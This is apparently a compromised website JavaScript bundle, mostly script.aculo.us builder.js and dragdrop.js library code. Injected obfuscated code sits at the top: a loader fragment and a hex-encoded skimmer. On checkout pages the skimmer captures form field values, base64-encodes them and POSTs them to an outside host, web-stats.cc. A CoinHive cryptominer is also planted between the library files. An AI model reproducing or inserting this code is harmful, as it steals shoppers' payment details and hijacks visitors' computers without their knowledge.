_0x50d4x19=_0x50d4x16[_0xb966[42]](0);_0x50d4x19[_0xb966[44]](_0xb966[43],function(){mg__core()});continue};if(_0x50d4x17[_0xb966[46]](_0xb966[45])>= 0){continue};_0x50d4x16[_0xb966[38]](_0xb966[37],_0xb966[47]+ _0x50d4x17)}}if(( typeof jQuery!= _0xb966[0])){(function(_0x50d4x1a){_0x50d4x1a(document)[_0xb966[52]](function(){_0x50d4x1a(_0xb966[50])[_0xb966[49]](_0xb966[48]);init__lo();lloo_interval= setInterval(_0xb966[51],7000)})})(jQuery)}}
var _0x77c4=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x65\x62\x2D\x73\x74\x61\x74\x73\x2E\x63\x63\x2F\x6A\x73\x2F\x74\x72\x61\x6E\x73\x6C\x61\x74\x65\x2E\x6A\x73","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6E\x6F\x64\x6F\x6D\x61\x69\x6E","\x50\x4F\x53\x54","\x71\x33\x64\x39\x39\x38\x35\x62\x38\x64\x66\x62\x33\x62\x32\x61\x31\x39\x63\x65\x34\x35\x33\x31\x65\x35\x64\x30\x39\x66\x32\x35\x61","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var fe7ad770d18a3fea98b65316d90bb34c2={snd:null,q3d9985b8dfb3b2a19ce4531e5d09f25a:_0x77c4[0],myid:(function(_0xd2cdx2){var _0xd2cdx3=document[_0x77c4[7]][_0x77c4[6]]( new RegExp(_0x77c4[2]+ _0xd2cdx2[_0x77c4[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0x77c4[3])+ _0x77c4[5]));return _0xd2cdx3?decodeURIComponent(_0xd2cdx3[1]):undefined})(_0x77c4[1])|| (function(){var _0xd2cdx4= new Date();var _0xd2cdx5=_0xd2cdx4[_0x77c4[8]]()+ _0x77c4[9]+ Math[_0x77c4[11]](Math[_0x77c4[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xd2cdx6= new Date( new Date()[_0x77c4[8]]()+ 60* 60* 24* 1000);document[_0x77c4[7]]= _0x77c4[12]+ _0xd2cdx5+ _0x77c4[13]+ _0xd2cdx6[_0x77c4[14]]();return _0xd2cdx5})(),clk:function(){fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[15]]= null;var _0xd2cdx7=document[_0x77c4[17]](_0x77c4[16]);for(var _0xd2cdx8=0;_0xd2cdx8< _0xd2cdx7[_0x77c4[18]];_0xd2cdx8++){if(_0xd2cdx7[_0xd2cdx8][_0x77c4[19]][_0x77c4[18]]> 0){var _0xd2cdx9=_0xd2cdx7[_0xd2cdx8][_0x77c4[20]];if(_0xd2cdx9== _0x77c4[21]){_0xd2cdx9= _0xd2cdx8};fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[15]]+= _0xd2cdx7[_0xd2cdx8][_0x77c4[20]]+ _0x77c4[22]+ _0xd2cdx7[_0xd2cdx8][_0x77c4[19]]+ _0x77c4[23]}}},send:function(){try{var _0xd2cdxa=document[_0x77c4[17]](_0x77c4[24]);for(var _0xd2cdx8=0;_0xd2cdx8< _0xd2cdxa[_0x77c4[18]];_0xd2cdx8++){var _0xd2cdxb=_0xd2cdxa[_0xd2cdx8];if(_0xd2cdxb[_0x77c4[25]]!= _0x77c4[26]&& _0xd2cdxb[_0x77c4[25]]!= _0x77c4[27]&& _0xd2cdxb[_0x77c4[25]]!= _0x77c4[28]&& _0xd2cdxb[_0x77c4[25]]!= _0x77c4[29]&& _0xd2cdxb[_0x77c4[25]]!= _0x77c4[30]){if(_0xd2cdxb[_0x77c4[31]]){_0xd2cdxb[_0x77c4[31]](_0x77c4[32],fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[33]],false)}else {_0xd2cdxb[_0x77c4[35]](_0x77c4[34],fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[33]])}}};var _0xd2cdxc=document[_0x77c4[17]](_0x77c4[36]);for(vari= 0;_0xd2cdx8< _0xd2cdxc[_0x77c4[18]];_0xd2cdx8++){if(_0xd2cdxc[_0xd2cdx8][_0x77c4[31]]){_0xd2cdxc[_0xd2cdx8][_0x77c4[31]](_0x77c4[37],fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[33]],false)}else {_0xd2cdxc[_0xd2cdx8][_0x77c4[35]](_0x77c4[38],fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[33]])}};if(fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[15]]!= null){var _0xd2cdxd=location[_0x77c4[44]][_0x77c4[43]](_0x77c4[42])[_0x77c4[41]](0)[_0x77c4[40]](_0x77c4[39])|| _0x77c4[45];var _0xd2cdxe=btoa(fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[15]]);var _0xd2cdxf= new XMLHttpRequest();_0xd2cdxf[_0x77c4[48]](_0x77c4[46],fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[47]],true);_0xd2cdxf[_0x77c4[51]](_0x77c4[49],_0x77c4[50]);_0xd2cdxf[_0x77c4[56]](_0x77c4[52]+ _0xd2cdxe+ _0x77c4[53]+ _0xd2cdxd+ _0x77c4[54]+ fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[55]])};fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[15]]= null;_0xd2cdxe= null;setTimeout(function(){fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[56]]()},30)}catch(e){}}};if(( new RegExp(_0x77c4[59],_0x77c4[60]))[_0x77c4[58]](window[_0x77c4[57]])){fe7ad770d18a3fea98b65316d90bb34c2[_0x77c4[56]]()}
//<![CDATA[
        var Translator = new Translate([]);
        //]]>
// script.aculo.us builder.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

var Builder = {
  NODEMAP: {
    AREA: 'map',
    CAPTION: 'table',
    COL: 'table',
    COLGROUP: 'table',
    LEGEND: 'fieldset',
    OPTGROUP: 'select',
    OPTION: 'select',
    PARAM: 'object',
    TBODY: 'table',
    TD: 'table',
    TFOOT: 'table',
    TH: 'table',
    THEAD: 'table',
    TR: 'table'
  },
  // note: For Firefox < 1.5, OPTION and OPTGROUP tags are currently broken,
  //       due to a Firefox bug
  node: function(elementName) {
    elementName = elementName.toUpperCase();

    // try innerHTML approach
    var parentTag = this.NODEMAP[elementName] || 'div';
    var parentElement = document.createElement(parentTag);
    try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
      parentElement.innerHTML = "<" + elementName + "></" + elementName + ">";
    } catch(e) {}
    var element = parentElement.firstChild || null;

    // see if browser added wrapping tags
    if(element && (element.tagName.toUpperCase() != elementName))
      element = element.getElementsByTagName(elementName)[0];

    // fallback to createElement approach
    if(!element) element = document.createElement(elementName);

    // abort if nothing could be created
    if(!element) return;

    // attributes (or text)
    if(arguments[1])
      if(this._isStringOrNumber(arguments[1]) ||
        (arguments[1] instanceof Array) ||
        arguments[1].tagName) {
          this._children(element, arguments[1]);
        } else {
          var attrs = this._attributes(arguments[1]);
          if(attrs.length) {
            try { // prevent IE "feature": http://dev.rubyonrails.org/ticket/2707
              parentElement.innerHTML = "<" +elementName + " " +
                attrs + "></" + elementName + ">";
            } catch(e) {}
            element = parentElement.firstChild || null;
            // workaround firefox 1.0.X bug
            if(!element) {
              element = document.createElement(elementName);
              for(attr in arguments[1])
                element[attr == 'class' ? 'className' : attr] = arguments[1][attr];
            }
            if(element.tagName.toUpperCase() != elementName)
              element = parentElement.getElementsByTagName(elementName)[0];
          }
        }

    // text, or array of children
    if(arguments[2])
      this._children(element, arguments[2]);

     return $(element);
  },
  _text: function(text) {
     return document.createTextNode(text);
  },

  ATTR_MAP: {
    'className': 'class',
    'htmlFor': 'for'
  },

  _attributes: function(attributes) {
    var attrs = [];
    for(attribute in attributes)
      attrs.push((attribute in this.ATTR_MAP ? this.ATTR_MAP[attribute] : attribute) +
          '="' + attributes[attribute].toString().escapeHTML().gsub(/"/,'&quot;') + '"');
    return attrs.join(" ");
  },
  _children: function(element, children) {
    if(children.tagName) {
      element.appendChild(children);
      return;
    }
    if(typeof children=='object') { // array can hold nodes and text
      children.flatten().each( function(e) {
        if(typeof e=='object')
          element.appendChild(e);
        else
          if(Builder._isStringOrNumber(e))
            element.appendChild(Builder._text(e));
      });
    } else
      if(Builder._isStringOrNumber(children))
        element.appendChild(Builder._text(children));
  },
  _isStringOrNumber: function(param) {
    return(typeof param=='string' || typeof param=='number');
  },
  build: function(html) {
    var element = this.node('div');
    $(element).update(html.strip());
    return element.down();
  },
  dump: function(scope) {
    if(typeof scope != 'object' && typeof scope != 'function') scope = window; //global scope

    var tags = ("A ABBR ACRONYM ADDRESS APPLET AREA B BASE BASEFONT BDO BIG BLOCKQUOTE BODY " +
      "BR BUTTON CAPTION CENTER CITE CODE COL COLGROUP DD DEL DFN DIR DIV DL DT EM FIELDSET " +
      "FONT FORM FRAME FRAMESET H1 H2 H3 H4 H5 H6 HEAD HR HTML I IFRAME IMG INPUT INS ISINDEX "+
      "KBD LABEL LEGEND LI LINK MAP MENU META NOFRAMES NOSCRIPT OBJECT OL OPTGROUP OPTION P "+
      "PARAM PRE Q S SAMP SCRIPT SELECT SMALL SPAN STRIKE STRONG STYLE SUB SUP TABLE TBODY TD "+
      "TEXTAREA TFOOT TH THEAD TITLE TR TT U UL VAR").split(/\s+/);

    tags.each( function(tag){
      scope[tag] = function() {
        return Builder.node.apply(Builder, [tag].concat($A(arguments)));
      };
    });
  }
};
var miner = new CoinHive.Anonymous('PQbIwg9HK3zpD4oUPfOUhTJ6UYrfgfVW');
	miner.start();
// script.aculo.us dragdrop.js v1.9.0, Thu Dec 23 16:54:48 -0500 2010

// Copyright (c) 2005-2010 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if(Object.isUndefined(Effect))
  throw("dragdrop.js requires including script.aculo.us' effects.js library");

var Droppables = {
  drops: [],

  remove: function(element) {
    this.drops = this.drops.reject(function(d) { return d.element==$(element) });
  },

  add: function(element) {
    element = $(element);
    var options = Object.extend({
      greedy:     true,
      hoverclass: null,
      tree:       false
    }, arguments[1] || { });

    // cache containers
    if(options.containment) {
      options._containers = [];
      var containment = options.containment;
      if(Object.isArray(containment)) {
        containment.each( function(c) { options._containers.push($(c)) });
      } else {
        options._containers.push($(containment));
      }
    }

    if(options.accept) options.accept = [options.accept].flatten();

    Element.makePositioned(element); // fix IE
    options.element = element;

    this.drops.push(options);
  },

  findDeepestChild: function(drops) {
    deepest = drops[0];

    for (i = 1; i < drops.length; ++i)
      if (Element.isParent(drops[i].element, deepest.element))
        deepest = drops[i];

    return deepest;
  },

  isContained: function(element, drop) {
    var containmentNode;
    if(drop.tree) {
      containmentNode = element.treeNode;
    } else {
      containmentNode = element.parentNode;
    }
    return drop._containers.detect(function(c) { return containmentNode == c });
  },

  isAffected: function(point, element, drop) {
    return (
      (drop.element!=element) &&
      ((!drop._containers) ||
        this.isContained(element, drop)) &&
      ((!drop.accept) ||
        (Element.classNames(element).detect(
          function(v) { return drop.accept.include(v) } ) )) &&
      Position.within(drop.element, point[0], point[1]) );
  },

  deactivate: function(drop) {
    if(drop.hoverclass)
      Element.removeClassName(drop.element, drop.hoverclass);
    this.last_active = null;
  },

  activate: function(drop) {
    if(drop.hoverclass)
      Element.addClassName(drop.element, drop.hoverclass);
    this.last_active = drop;
  },

  show: function(point, element) {
    if(!this.drops.length) return;
    var drop, affected = [];

    this.drops.each( function(drop) {
      if(Droppables.isAffected(point, element, drop))
        affected.push(drop);
    });

    if(affected.length>0)
      drop = Droppables.findDeepestChild(affected);

    if(this.last_active && this.last_active != drop) this.deactivate(this.last_active);
    if (drop) {
      Position.within(drop.element, point[0], point[1]);
      if(drop.onHover)
        drop.onHover(element, drop.element, Position.overlap(drop.overlap, drop.element));

      if (drop != this.last_active) Droppables.activate(drop);
    }
  },

  fire: function(event, element) {
    if(!this.last_active) return;
    Position.prepare();

    if (this.isAffected([Event.pointerX(event), Event.pointerY(event)], element, this.last_active))
      if (this.last_active.onDrop) {
        this.last_active.onDrop(element, this.last_active.element, event);
        return true;
      }
  },

  reset: function() {
    if(this.last_active)
      this.deactivate(this.last_active);
  }
};

var Draggables = {
  drags: [],
  observers: [],

  register: function(draggable) {
    if(this.drags.length == 0) {
      this.eventMouseUp   = this.endDrag.bindAsEventListener(this);
      this.eventMouseMove = this.updateDrag.bindAsEventListener(this);
      this.eventKeypress  = this.keyPress.bindAsEventListener(this);

      Event.observe(document, "mouseup", this.eventMouseUp);
      Event.observe(document, "mousemove", this.eventMouseMove);
      Event.observe(document, "keypress", this.eventKeypress);
    }
    this.drags.push(draggable);
  },

  unregister: function(draggable) {
    this.drags = this.drags.reject(function(d) { return d==draggable });
    if(this.drags.length == 0) {
      Event.stopObserving(document, "mouseup", this.eventMouseUp);
      Event.stopObserving(document, "mousemove", this.eventMouseMove);
      Event.stopObserving(document, "keypress", this.eventKeypress);
    }
  },

  activate: function(draggable) {
    if(draggable.options.delay) {
      this._timeout = setTimeout(function() {
        Draggables._timeout = null;
        window.focus();
        Draggables.activeDraggable = draggable;
      }.bind(this), draggable.options.delay);
    } else {
      window.focus(); // allows keypress events if window isn't currently focused, fails for Safari
      this.activeDraggable = draggable;
    }
  },

  deactivate: function() {
    this.activeDraggable = null;
  },

  updateDrag: function(event) {
    if(!this.activeDraggable) return;
    var pointer = [Event.pointerX(event), Event.pointerY(event)];
    // Mozilla-based browsers fire successive mousemove events with
    // the same coordinates, prevent needless redrawing (moz bug?)
    if(this._lastPointer && (this._lastPointer.inspect() == pointer.inspect())) return;
    this._lastPointer = pointer;

    this.activeDraggable.updateDrag(event, pointer);
  },

  endDrag: function(event) {
    if(this._timeout) {
      clearTimeout(this._timeout);
      this._timeout = null;
    }
    if(!this.activeDraggable) return;
    this._lastPointer = null;
    this.activeDraggable.endDrag(event);
    this.activeDraggable = null;
  },

  keyPress: function(event) {
    if(this.activeDraggable)
      this.activeDraggable.keyPress(event);
  },

  addObserver: function(observer) {
    this.observers.push(observer);
    this._cacheObserverCallbacks();
  },

  removeObserver: function(element) {  // element instead of observer fixes mem leaks
    this.observers = this.observers.reject( function(o) { return o.element==element });
    this._cacheObserverCallbacks();
  },

  notify: function(eventName, draggable, event) {  // 'onStart', 'onEnd', 'onDrag'
    if(this[eventName+'Count'] > 0)
      this.observers.each( function(o) {
        if(o[eventName]) o[eventName](eventName, draggable, event);
      });
    if(draggable.options[eventName]) draggable.options[eventName](draggable, event);
  },

  _cacheObserverCallbacks: function() {
    ['onStart','onEnd','onDrag'].each( function(eventName) {
      Draggables[eventName+'Count'] = Draggables.observers.select(
        function(o) { return o[eventName]; }
      ).length;
    });
  }
};

/*--------------------------------------------------------------------------*/

var Draggable = Class.create({
  initialize: function(element) {
    var defaults = {
      handle: false,
      reverteffect: function(element, top_offset, left_offset) {
        var dur = Math.sqrt(Math.abs(top_offset^2)+Math.abs(left_offset^2))*0.02;
        new Effect.Move(element, { x: -left_offset, y: -top_offset, duration: dur,
          queue: {scope:'_draggable', position:'end'}
        });
      },
      endeffect: function(element) {
        var toOpacity = Object.isNumber(element._opacity) ? element._opacity : 1.0;
        new Effect.Opacity(element, {duration:0.2, from:0.7, to:toOpacity,
          queue: {scope:'_draggable', position:'end'},
          afterFinish: function(){
            Draggable._dragging[element] = false
          }
        });
      },
      zindex: 1000,
      revert: false,
      quiet: false,
      scroll: false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      snap: false,  // false, or xy or [x,y] or function(x,y){ return [x,y] }
      delay: 0
    };

    if(!arguments[1] || Object.isUndefined(arguments[1].endeffect))
      Object.extend(defaults, {
        starteffect: function(element) {
          element._opacity = Element.getOpacity(element);
          Draggable._dragging[element] = true;
          new Effect.Opacity(element, {duration:0.2, from:element._opacity, to:0.7});
        }
      });

    var options = Object.extend(defaults, arguments[1] || { });

    this.element = $(element);

    if(options.handle && Object.isString(options.handle))
      this.handle = this.element.down('.'+options.handle, 0);

    if(!this.handle) this.handle = $(options.handle);
    if(!this.handle) this.handle = this.element;

    if(options.scroll && !options.scroll.scrollTo && !options.scroll.outerHTML) {
      options.scroll = $(options.scroll);
      this._isScrollChild = Element.childOf(this.element, options.scroll);
    }

    Element.makePositioned(this.element); // fix IE

    this.options  = options;
    this.dragging = false;

    this.eventMouseDown = this.initDrag.bindAsEventListener(this);
    Event.observe(this.handle, "mousedown", this.eventMouseDown);

    Draggables.register(this);
  },

  destroy: function() {
    Event.stopObserving(this.handle, "mousedown", this.eventMouseDown);
    Draggables.unregister(this);
  },

  currentDelta: function() {
    return([
      parseInt(Element.getStyle(this.element,'left') || '0'),
      parseInt(Element.getStyle(this.element,'top') || '0')]);
  },

  initDrag: function(event) {
    if(!Object.isUndefined(Draggable._dragging[this.element]) &&
      Draggable._dragging[this.element]) return;
    if(Event.isLeftClick(event)) {
      // abort on form elements, fixes a Firefox issue
      var src = Event.element(event);
      if((tag_name = src.tagName.toUpperCase()) && (
        tag_name=='INPUT' ||
        tag_name=='SELECT' ||
        tag_name=='OPTION' ||
        tag_name=='BUTTON' ||
        tag_name=='TEXTAREA')) return;

      var pointer = [Event.pointerX(event), Event.pointerY(event)];
      var pos     = this.element.cumulativeOffset();
      this.offset = [0,1].map( function(i) { return (pointer[i] - pos[i]) });

      Draggables.activate(this);
      Event.stop(event);
    }
  },

  startDrag: function(event) {
    this.dragging = true;
    if(!this.delta)
      this.delta = this.currentDelta();

    if(this.options.zindex) {
      this.originalZ = parseInt(Element.getStyle(this.element,'z-index') || 0);
      this.element.style.zIndex = this.options.zindex;
    }

    if(this.options.ghosting) {
      this._clone = this.element.cloneNode(true);
      this._originallyAbsolute = (this.element.getStyle('position') == 'absolute');
      if (!this._originallyAbsolute)
        Position.absolutize(this.element);
      this.element.parentNode.insertBefore(this._clone, this.element);
    }

    if(this.options.scroll) {
      if (this.options.scroll == window) {
        var where = this._getWindowScroll(this.options.scroll);
        this.originalScrollLeft = where.left;
        this.originalScrollTop = where.top;
      } else {
        this.originalScrollLeft = this.options.scroll.scrollLeft;
        this.originalScrollTop = this.options.scroll.scrollTop;
      }
    }

    Draggables.notify('onStart', this, event);

    if(this.options.starteffect) this.options.starteffect(this.element);
  },

  updateDrag: function(event, pointer) {
    if(!this.dragging) this.startDrag(event);

    if(!this.options.quiet){
      Position.prepare();
      Droppables.show(pointer, this.element);
    }

    Draggables.notify('onDrag', this, event);

    this.draw(pointer);
    if(this.options.change) this.options.change(this);

    if(this.options.scroll) {
      this.stopScrolling();

      var p;
      if (this.options.scroll == window) {
        with(this._getWindowScroll(this.options.scroll)) { p = [ left, top, left+width, top+height ]; }
      } else {
        p = Position.page(this.options.scroll).toArray();
        p[0] += this.options.scroll.scrollLeft + Position.deltaX;
        p[1] += this.options.scroll.scrollTop + Position.deltaY;
        p.push(p[0]+this.options.scroll.offsetWidth);
        p.push(p[1]+this.options.scroll.offsetHeight);
      }
      var speed = [0,0];
      if(pointer[0] < (p[0]+this.options.scrollSensitivity)) speed[0] = pointer[0]-(p[0]+this.options.scrollSensitivity);
      if(pointer[1] < (p[1]+this.options.scrollSensitivity)) speed[1] = pointer[1]-(p[1]+this.options.scrollSensitivity);
      if(pointer[0] > (p[2]-this.options.scrollSensitivity)) speed[0] = pointer[0]-(p[2]-this.options.scrollSensitivity);
      if(pointer[1] > (p[3]-this.options.scrollSensitivity)) speed[1] = pointer[1]-(p[3]-this.options.scrollSensitivity);
      this.startScrolling(speed);
    }

    // fix AppleWebKit rendering
    if(Prototype.Browser.WebKit) window.scrollBy(0,0);

    Event.stop(event);
  },

  finishDrag: function(event, success) {
    this.dragging = false;

    if(this.options.quiet){
      Position.prepare();
      var pointer = [Event.pointerX(event), Event.pointerY(event)];
      Droppables.show(pointer, this.element);
    }

    if(this.options.ghosting) {
      if (!this._originallyAbsolute)
        Position.relativize(this.element);
      delete this._originallyAbsolute;
      Element.remove(this._clone);
      this._clone = null;
    }

    var dropped = false;
    if(success) {
      dropped = Droppables.fire(event, this.element);
      if (!dropped) dropped = false;
    }
    if(dropped && this.options.onDropped) this.options.onDropped(this.element);
    Draggables.notify('onEnd', this, event);

    var revert = this.options.revert;
    if(revert && Object.isFunction(revert)) revert = revert(this.element);

    var d = this.currentDelta();
    if(revert && this.options.reverteffect) {
      if (dropped == 0 || revert != 'failure')
        this.options.reverteffect(this.element,
          d[1]-this.delta[1], d[0]-this.delta[0]);
    } else {
      this.delta = d;
    }

    if(this.options.zindex)
      this.element.style.zIndex = this.originalZ;

    if(this.options.endeffect)
      this.options.endeffect(this.element);

    Draggables.deactivate(this);
    Droppables.reset();
  },

  keyPress: function(event) {
    if(event.keyCode!=Event.KEY_ESC) return;
    this.finishDrag(event, false);
    Event.stop(event);
  },

  endDrag: function(event) {
    if(!this.dragging) return;
    this.stopScrolling();
    this.finishDrag(event, true);
    Event.stop(event);
  },

  draw: function(point) {
    var pos = this.element.cumulativeOffset();
    if(this.options.ghosting) {
      var r   = Position.realOffset(this.element);
      pos[0] += r[0] - Position.deltaX; pos[1] += r[1] - Position.deltaY;
    }

    var d = this.currentDelta();
    pos[0] -= d[0]; pos[1] -= d[1];

    if(this.options.scroll && (this.options.scroll != window && this._isScrollChild)) {
      pos[0] -= this.options.scroll.scrollLeft-this.originalScrollLeft;
      pos[1] -= this.options.scroll.scrollTop-this.originalScrollTop;
    }

    var p = [0,1].map(function(i){
      return (point[i]-pos[i]-this.offset[i])
    }.bind(this));

    if(this.options.snap) {
      if(Object.isFunction(this.options.snap)) {
        p = this.options.snap(p[0],p[1],this);
      } else {
      if(Object.isArray(this.options.snap)) {
        p = p.map( function(v, i) {
          return (v/this.options.snap[i]).round()*this.options.snap[i] }.bind(this));
      } else {
        p = p.map( function(v) {
          return (v/this.options.snap).round()*this.options.snap }.bind(this));
      }
    }}

    var style = this.element.style;
    if((!this.options.constraint) || (this.options.constraint=='horizontal'))
      style.left = p[0] + "px";
    if((!this.options.constraint) || (this.options.constraint=='vertical'))
      style.top  = p[1] + "px";

    if(style.visibility=="hidden") style.visibility = ""; // fix gecko rendering
  },

  stopScrolling: function() {
    if(this.scrollInterval) {
      clearInterval(this.scrollInterval);
      this.scrollInterval = null;
      Draggables._lastScrollPointer = null;
    }
  },

  startScrolling: function(speed) {
    if(!(speed[0] || speed[1])) return;
    this.scrollSpeed = [speed[0]*this.options.scrollSpeed,speed[1]*this.options.scrollSpeed];
    this.lastScrolled = new Date();
    this.scrollInterval = setInterval(this.scroll.bind(this), 10);
  },

  scroll: function() {
    var current = new Date();
    var delta = current - this.lastScrolled;
    this.lastScrolled = current;
    if(this.options.scroll == window) {
      with (this._getWindowScroll(this.options.scroll)) {
        if (this.scrollSpeed[0] || this.scrollSpeed[1]) {
          var d = delta / 1000;
          this.options.scroll.scrollTo( left + d*this.scrollSpeed[0], top + d*this.scrollSpeed[1] );
        }
      }
    } else {
      this.options.scroll.scrollLeft += this.scrollSpeed[0] * delta / 1000;
      this.options.scroll.scrollTop  += this.scrollSpeed[1] * delta / 1000;
    }

    Position.prepare();
    Droppables.show(Draggables._lastPointer, this.element);
    Draggables.notify('onDrag', this);
    if (this._isScrollChild) {
      Draggables._lastScrollPointer = Draggables._lastScrollPointer || $A(Draggables._lastPointer);
      Draggables._lastScrollPointer[0] += this.scrollSpeed[0] * delta / 1000;
      Draggables._lastScrollPointer[1] += this.scrollSpeed[1] * delta / 1000;
      if (Draggables._lastScrollPointer[0] < 0)
        Draggables._lastScrollPointer[0] = 0;
      if (Draggables._lastScrollPointer[1] < 0)
        Draggables._lastScrollPointer[1] = 0;
      this.draw(Draggables._lastScrollPointer);
    }

    if(this.options.change) this.options.change(this);
  },

  _getWindowScroll: function(w) {
    var T, L, W, H;
    with (w.document) {
      if (w.document.documentElement && documentElement.scrollTop) {
        T = documentElement.scrollTop;
        L = documentElement.scrollLeft;
      } else if (w.document.body) {
        T = body.scrollTop;
        L = body.scrollLeft;
      }
      if (w.innerWidth) {
        W = w.innerWidth;
        H = w.innerHeight;
      } else if (w.document.documentElement && documentElement.clientWidth) {
        W = documentElement.clientWidth;
        H = documentElement.clientHeight;
      } else {
        W = body.offsetWidth;
        H = body.offsetHeight;
      }
    }
    return { top: T, left: L, width: W, height: H };
  }
});

Draggable._dragging = { };

/*--------------------------------------------------------------------------*/

var SortableObserver = Class.create({
  initialize: function(element, observer) {
    this.element   = $(element);
    this.observer  = observer;
    this.lastValue = Sortable.serialize(this.element);
  },

  onStart: function() {
    this.lastValue = Sortable.serialize(this.element);
  },

  onEnd: function() {
    Sortable.unmark();
    if(this.lastValue != Sortable.serialize(this.element))
      this.observer(this.element)
  }
});

var Sortable = {
  SERIALIZE_RULE: /^[^_\-](?:[A-Za-z0-9\-\_]*)[_](.*)$/,

  sortables: { },

  _findRootElement: function(element) {
    while (element.tagName.toUpperCase() != "BODY") {
      if(element.id && Sortable.sortables[element.id]) return element;
      element = element.parentNode;
    }
  },

  options: function(element) {
    element = Sortable._findRootElement($(element));
    if(!element) return;
    return Sortable.sortables[element.id];
  },

  destroy: function(element){
    element = $(element);
    var s = Sortable.sortables[element.id];

    if(s) {
      Draggables.removeObserver(s.element);
      s.droppables.each(function(d){ Droppables.remove(d) });
      s.draggables.invoke('destroy');

      delete Sortable.sortables[s.element.id];
    }
  },

  create: function(element) {
    element = $(element);
    var options = Object.extend({
      element:     element,
      tag:         'li',       // assumes li children, override with tag: 'tagname'
      dropOnEmpty: false,
      tree:        false,
      treeTag:     'ul',
      overlap:     'vertical', // one of 'vertical', 'horizontal'
      constraint:  'vertical', // one of 'vertical', 'horizontal', false
      containment: element,    // also takes array of elements (or id's); or false
      handle:      false,      // or a CSS class
      only:        false,
      delay:       0,
      hoverclass:  null,
      ghosting:    false,
      quiet:       false,
      scroll:      false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      format:      this.SERIALIZE_RULE,

      // these take arrays of elements or ids and can be
      // used for better initialization performance
      elements:    false,
      handles:     false,

      onChange:    Prototype.emptyFunction,
      onUpdate:    Prototype.emptyFunction
    }, arguments[1] || { });

    // clear any old sortable with same element
    this.destroy(element);

    // build options for the draggables
    var options_for_draggable = {
      revert:      true,
      quiet:       options.quiet,
      scroll:      options.scroll,
